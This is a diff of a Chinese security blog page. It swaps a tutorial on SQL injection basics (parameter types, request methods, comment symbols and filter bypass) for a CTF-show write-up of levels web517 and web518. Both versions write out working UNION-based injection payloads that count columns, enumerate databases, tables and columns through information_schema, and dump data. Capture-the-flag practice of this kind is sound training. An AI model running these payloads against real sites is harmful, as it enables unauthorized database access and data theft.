@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="web漏洞">
-    <meta name="description" content="SQL注入，注入类型以及提交注入">
+    <meta name="keywords" content="信息收集">
+    <meta name="description" content="CTF-show(web1-web17)">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>web-SQL注入（3） | E=MC^2</title>
+    <title>CTF-show:sqli-libs（1） | E=MC^2</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -298,12 +298,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">web-SQL注入（3）</h1>
+                    <h1 class="description center-align post-title">CTF-show:sqli-libs（1）</h1>
                 </div>
             </div>
         </div>
@@ -419,8 +419,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                                <span class="chip bg-color">SQL注入</span>
+                            <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+                                <span class="chip bg-color">信息收集</span>
                             </a>
                         
                     </div>
@@ -431,8 +431,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%B0%8F%E8%BF%AA%E6%B8%97%E9%80%8F/" class="post-category">
-                                小迪渗透
+                            <a href="/categories/CTF-show/" class="post-category">
+                                CTF-show
                             </a>
                         
                     </div>
@@ -444,28 +444,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-14
+                    2022-03-19
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-03-14
+                    2022-03-19
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    866
+                    384
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    1 分
                 </div>
                 
 
@@ -485,68 +485,53 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="1、参数类型"><a href="#1、参数类型" class="headerlink" title="1、参数类型"></a>1、参数类型</h3><p>（1）数字型</p>
-<p>数字型一般是没有符号，也就是一般是不需要闭合的。数字型也是可以加符号的。</p>
-<p><code>select * from user where id=1</code></p>
-<p>（2）字符型</p>
-<p>字符型是会有引号，所以在注入的时候需要闭合引号，以及注释多于的符号</p>
-<p>干扰符号：单引号，双引号，百分号，括号（小括号，花括号）</p>
-<p>百分号：SQL语句中的搜索符号（类似于Windows的星号）</p>
-<p><code>?x=xxxx</code></p>
-<p><code>select * from user where name like &#39;%xxxx%&#39;</code>在搜索的时候前后有此关键字的都可以被搜索到</p>
-<p><code>select * from user where name = &#39;xxxx&#39;</code></p>
-<p><code>$name = $_GET[&#39;X&#39;]</code></p>
-<p><code>$sql=&quot;select * from user where name=&#39;$name&#39;&quot;;</code></p>
-<p><code>?x=xxx and 1=1</code></p>
-<p><code>select * from user where name=&#39;xxxx and 1=1&#39;</code>此情况下and 1=1的判断效果就没了</p>
-<p><code>?x=xxx&#39; and 1=1--+</code>注释掉了后面的单引号</p>
-<p><code>select * from user where name=&#39;xxxx&#39; and 1=1</code></p>
-<p>（3）JSON类型</p>
-<p><code>json=&#123;&quot;username&quot;:&quot;Dumb&#39; and 1=2 union select 1,database(),3#&quot;&#125;</code></p>
-<p>键值对：<code>&#123;&#39;user&#39;:&#39;xxxx&#39;&#125;</code></p>
-<h3 id="2、请求方法"><a href="#2、请求方法" class="headerlink" title="2、请求方法"></a>2、请求方法</h3><p>From：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a5cdfd2bda66">https://www.jianshu.com/p/a5cdfd2bda66</a></p>
-<p>可以在<code>Request Headers</code>处查看</p>
-<p>（1）GET请求</p>
-<p>GET请求也可传参到后台，但是其参数在浏览器的地址栏的url中可见，且参数长度也是有限制的。</p>
-<p>GET 请求可被缓存</p>
-<p>GET请求只能进行url编码</p>
-<p>GET请求比较常见的方式是通过url地址栏请求</p>
-<p>GET前面无论是什么请求，只要它存在于URL中即可显示</p>
-<p>（2）POST请求</p>
-<p>POST请求传递参数放在Request body中，不会在url中显示，比GET要安全，且参数长度无限制</p>
-<p>POST支持多种编码方式（二进制数据使用多重编码。）</p>
-<p>POST 请求不会被缓存</p>
-<p>POST最常见是通过form表单发送数据请求</p>
-<p>（3）COOKIE</p>
-<p>Cookies是数据包里的参数，存放一些用户信息以便于让Web服务器辨别用户的身份。</p>
-<p>可接收GET、POST等请求</p>
-<p><code>$c = COOKIE[&#39;x&#39;]</code></p>
-<p><code>echo $c</code></p>
-<p>（4）REQUEST请求</p>
-<p>GET、POST、COOKIE等都可接收</p>
-<p>（5）HTTP头</p>
-<p><code>$_SERVER</code>:获取系统的值，当前用户IP地址，浏览器语言等</p>
-<p><code>$s=$_SERVER[&#39;HTTP_USER_AGENT&#39;];</code></p>
-<p><code>echo $s;</code></p>
-<h3 id="3、注释符号"><a href="#3、注释符号" class="headerlink" title="3、注释符号"></a>3、注释符号</h3><p>From:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/impulse-/p/13184023.html#gangkong">https://www.cnblogs.com/impulse-/p/13184023.html#gangkong</a></p>
-<p>将后面不需要的语句注释掉，以保证SQL命令的完整性</p>
-<p>（1）<code>--</code>后面有空格（<code>--+</code>）</p>
-<p>（2）<code>#</code></p>
-<p>URL中#号作为锚点，不当做数据来传输</p>
-<p>命令传到后端，少了一个单引号用来闭合命令（可以利用这种特性，在URL中命令结尾添加一个单引号来代替注释符）</p>
-<p>解决：直接在URL中使用#号有问题，可以把#号转换成URL编码（%23）</p>
-<p>传输过程对单引号还有空格进行了URL编码，在前端注释符使用URL编码，传输过程中把URL编码带上，到后端就会进行一次URL解码操作，#号注释符起作用。</p>
-<p>前端：<code>?id=-1&#39; union select 1,2,database()%23</code></p>
-<p>后端：</p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203142142416.png" alt="MySQL命令行"></p>
-<p>（3）<code>/**/</code></p>
-<p>注释符<code># --</code> 都是把后面的语句全部注释掉了，而内联注释<code>/**/</code>则是注释指定部分，需要一前一后闭合，所以在传参那里几乎不做注释语句用，而是用于过滤空格等bypass</p>
-<p>例如：<code>?id=-1&#39;/**/union/**/select/**/1,2,database()--+   //过滤空格,用/**/代替空格</code></p>
-<p>（4）payload结尾单引号闭合</p>
-<p><code>?id=-1&#39; union select 1,2,database()&#39;</code></p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203142146913.png" alt="GET传参"></p>
-<p>总结：</p>
-<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203142146203.png" alt="总结"></p>
+                <p>From:<a target="_blank" rel="noopener" href="https://blog.csdn.net/ZXT2804567059/article/details/120145182">https://blog.csdn.net/ZXT2804567059/article/details/120145182</a></p>
+<h3 id="1、web517"><a href="#1、web517" class="headerlink" title="1、web517"></a>1、web517</h3><p>字符型注入-联合查询</p>
+<p>（1）注入字符判断</p>
+<p>提示是字符型，猜测是否为单引号</p>
+<p><code>?id=1&#39; and 1=1 --+</code>正常回显，判断为单引号字符注入</p>
+<p>（2）字段判断</p>
+<p><code>?id=-1&#39; order by 4 --+</code>在字段为4时出现报错，于是知道有3个字段</p>
+<p>（3）联合查询</p>
+<p>回显判断：2,3字段</p>
+<p><code>?id=-1&#39; union select 1,2,3--+</code></p>
+<img src="https://gitee.com/mie1732/emc/raw/master/img/202203191149492.png" alt="回显" style="zoom:50%;" />
+
+<p>用户，所在数据库</p>
+<p><code>?id=-1&#39; union select 1,user(),database()--+</code></p>
+<img src="https://gitee.com/mie1732/emc/raw/master/img/202203191150703.png" alt="root权限" style="zoom:67%;" />
+
+<p>查询所有数据库</p>
+<p><code>?id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></p>
+<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203191154237.png" alt="ctfshow"></p>
+<p>发现ctfshow的数据库</p>
+<p>查询ctfshow数据库下的表名</p>
+<p><code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;ctfshow&#39;--+</code></p>
+<img src="https://gitee.com/mie1732/emc/raw/master/img/202203191204811.png" alt="flag表" style="zoom:67%;" />
+
+<p>查询flag表下的列名</p>
+<p><code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;--+</code></p>
+<p>得到id和flag列</p>
+<p>查询flag列下的数据</p>
+<p><code>?id=-1&#39; union select 1,2,group_concat(flag) from ctfshow.flag--+</code></p>
+<h3 id="2、web518"><a href="#2、web518" class="headerlink" title="2、web518"></a>2、web518</h3><p>数字型-联合注入</p>
+<p>（1）字段判断</p>
+<p><code>?id=1 order by 3</code>到4不能正常回显，有3个字段</p>
+<p>（2）回显判断</p>
+<p><code>?id=-1 union select 1,2,3</code>2,3字段可回显</p>
+<img src="https://gitee.com/mie1732/emc/raw/master/img/202203191214638.png" alt="2,3" style="zoom:50%;" />
+
+<p>（3）联合注入</p>
+<p>信息收集：</p>
+<p><code>?id=-1 union select 1,user(),database()</code></p>
+<p>查询所有数据库：</p>
+<p><code>?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata</code></p>
+<p>数据库ctfshow下表的查询：</p>
+<p><code>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;ctfshow&#39;</code></p>
+<p>数据库下表flagaa的列的查询：</p>
+<p><code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;flagaa&#39;</code></p>
+<p>列flagac下数据的查询</p>
+<p><code>?id=-1 union select 1,2,group_concat(flagac) from ctfshow.flagaa</code> </p>
 
                 
             </div>
@@ -573,7 +558,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/03/14/web-SQL%E6%B3%A8%E5%85%A5%EF%BC%883%EF%BC%89/">http://example.com/2022/03/14/web-SQL%E6%B3%A8%E5%85%A5%EF%BC%883%EF%BC%89/</a>
+                    <a href="http://example.com/2022/03/19/CTF-show-sqli-libs%EF%BC%881%EF%BC%89/">http://example.com/2022/03/19/CTF-show-sqli-libs%EF%BC%881%EF%BC%89/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -611,8 +596,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                                    <span class="chip bg-color">SQL注入</span>
+                                <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+                                    <span class="chip bg-color">信息收集</span>
                                 </a>
                             
                         </div>
@@ -658,46 +643,48 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/03/14/sqli-labs-1/">
+                <a href="/2022/03/19/CTF-show-sqli-libs%EF%BC%881%EF%BC%89/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="sqli-labs(1)">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="CTF-show:sqli-libs（1）">
                         
-                        <span class="card-title">sqli-labs(1)</span>
+                        <span class="card-title">CTF-show:sqli-libs（1）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            SQL注入练习
+                            CTF-show(web1-web17)
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-14
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-19
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/sqli-labs/" class="post-category">
-                                    sqli-labs
+                            <a href="/categories/CTF-show/" class="post-category">
+                                    CTF-show
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                        <span class="chip bg-color">SQL注入</span>
+                    <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+                        <span class="chip bg-color">信息收集</span>
                     </a>
                     
                 </div>
@@ -711,31 +698,31 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/12/php%E5%9F%BA%E7%A1%80/">
+                <a href="/2022/03/17/web-SQL%E6%B3%A8%E5%85%A5%EF%BC%885%EF%BC%89/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="php基础">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="web-SQL注入（5）">
                         
-                        <span class="card-title">php基础</span>
+                        <span class="card-title">web-SQL注入（5）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            PHP基础
+                            SQL注入，查询方式和报错盲注
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-12
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-17
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/PHP/" class="post-category">
-                                    PHP
+                            <a href="/categories/%E5%B0%8F%E8%BF%AA%E6%B8%97%E9%80%8F/" class="post-category">
+                                    小迪渗透
                                 </a>
                             
                             
@@ -745,8 +732,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/PHP/">
-                        <span class="chip bg-color">PHP</span>
+                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">SQL注入</span>
                     </a>
                     
                 </div>
